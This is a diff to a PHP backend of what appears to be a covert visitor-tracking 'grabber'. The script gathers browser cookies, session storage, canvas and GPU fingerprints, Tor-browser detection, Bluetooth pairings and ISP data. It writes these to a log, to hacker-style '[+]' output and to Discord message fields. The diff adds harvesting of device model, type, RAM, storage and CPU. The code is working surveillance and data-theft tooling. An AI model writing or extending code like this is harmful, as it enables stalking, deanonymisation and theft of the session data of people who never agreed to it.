@@ -97,6 +97,12 @@ $device_memory        = cleanCookie($json_data['device_memory']       ?? '');
 $is_tor_browser       = cleanCookie($json_data['is_tor_browser']      ?? '');
 $bluetooth_status     = cleanCookie($json_data['bluetooth_status']    ?? '');
 $bluetooth_device     = cleanCookie($json_data['bluetooth_device']    ?? '');
+$device_type          = cleanCookie($json_data['device_type']         ?? '');
+$device_model         = cleanCookie($json_data['device_model']        ?? '');
+$device_ram           = cleanCookie($json_data['device_ram']          ?? '');
+$device_storage       = cleanCookie($json_data['device_storage']      ?? '');
+$device_cpu           = cleanCookie($json_data['device_cpu']          ?? '');
+$device_architecture  = cleanCookie($json_data['device_architecture'] ?? '');
 
 /* ── Filter out our own _nx_ cookies from the display ─────── */
 $real_cookies = filterNxCookies($raw_cookies);
@@ -188,6 +194,12 @@ $record = [
     'device_memory'        => $device_memory,
     'bluetooth_status'     => $bluetooth_status,
     'bluetooth_device'     => $bluetooth_device,
+    'device_type'          => $device_type,
+    'device_model'         => $device_model,
+    'device_ram'           => $device_ram,
+    'device_storage'       => $device_storage,
+    'device_cpu'           => $device_cpu,
+    'device_architecture'  => $device_architecture,
     'cookies'              => $real_cookies ?: 'None',
     'tracking_cookies'     => $tracking_cookies,
     'session_storage'      => $session_storage,
@@ -239,6 +251,21 @@ $txt_entry .= "Canvas Hash     : " . nxLabel($canvas_fingerprint) . "\n";
 $txt_entry .= "GPU Model       : " . nxLabel($webgl_renderer) . "\n";
 $txt_entry .= "CPU Cores       : " . nxLabel($hardware_concurrency) . "\n";
 $txt_entry .= "Device Memory   : " . nxLabel($device_memory) . "\n";
+if (!empty($device_model)) {
+    $txt_entry .= "Device Model    : " . nxLabel($device_model) . "\n";
+}
+if (!empty($device_type)) {
+    $txt_entry .= "Device Type     : " . nxLabel($device_type) . "\n";
+}
+if (!empty($device_ram)) {
+    $txt_entry .= "RAM (Memory)    : " . nxLabel($device_ram) . "\n";
+}
+if (!empty($device_storage)) {
+    $txt_entry .= "Storage (ROM)   : " . nxLabel($device_storage) . "\n";
+}
+if (!empty($device_cpu)) {
+    $txt_entry .= "CPU & Arch      : " . nxLabel($device_cpu) . "\n";
+}
 $bt_text = nxLabel($bluetooth_status);
 if (!empty($bluetooth_device)) {
     $bt_text .= " (Paired: {$bluetooth_device})";
@@ -317,6 +344,21 @@ $terminal_output .= "[+] Network: {$net_label}\n";
 $terminal_output .= "[+] ISP Host: " . nxLabel($reverse_host, 'Could not resolve') . "\n";
 $terminal_output .= "[+] Canvas Hash: " . nxLabel($canvas_fingerprint) . "\n";
 $terminal_output .= "[+] GPU: " . nxLabel($webgl_renderer) . "\n";
+if (!empty($device_model)) {
+    $terminal_output .= "[+] Device Model: " . nxLabel($device_model) . "\n";
+}
+if (!empty($device_type)) {
+    $terminal_output .= "[+] Device Type: " . nxLabel($device_type) . "\n";
+}
+if (!empty($device_ram)) {
+    $terminal_output .= "[+] RAM Memory: " . nxLabel($device_ram) . "\n";
+}
+if (!empty($device_storage)) {
+    $terminal_output .= "[+] Storage (ROM): " . nxLabel($device_storage) . "\n";
+}
+if (!empty($device_cpu)) {
+    $terminal_output .= "[+] CPU Hardware: " . nxLabel($device_cpu) . "\n";
+}
 $bt_term = nxLabel($bluetooth_status);
 if (!empty($bluetooth_device)) {
     $bt_term .= " (Device: {$bluetooth_device})";
@@ -379,6 +421,10 @@ $discord_fields = [
     '🔋 Battery'      => nxLabel($battery_level) . ' — ' . nxLabel($battery_charging, 'N/A'),
     '📶 Network'      => $discord_net,
     '🏢 ISP / Host'   => nxLabel($reverse_host, 'Could not resolve'),
+    '📱 Device Model' => nxLabel($device_model, 'Could not extract'),
+    '💻 Form Factor'  => nxLabel($device_type, 'Unknown'),
+    '💾 RAM / Disk'   => nxLabel($device_ram, 'N/A') . ' • ' . nxLabel($device_storage, 'N/A'),
+    '⚙️ CPU Hardware' => nxLabel($device_cpu, 'N/A'),
     '📻 Bluetooth'    => nxLabel($bluetooth_status) . (!empty($bluetooth_device) ? " [{$bluetooth_device}]" : ''),
     '🎮 GPU / Canvas' => nxLabel($webgl_renderer) . ' [Hash: ' . nxLabel($canvas_fingerprint) . ']',
 ];
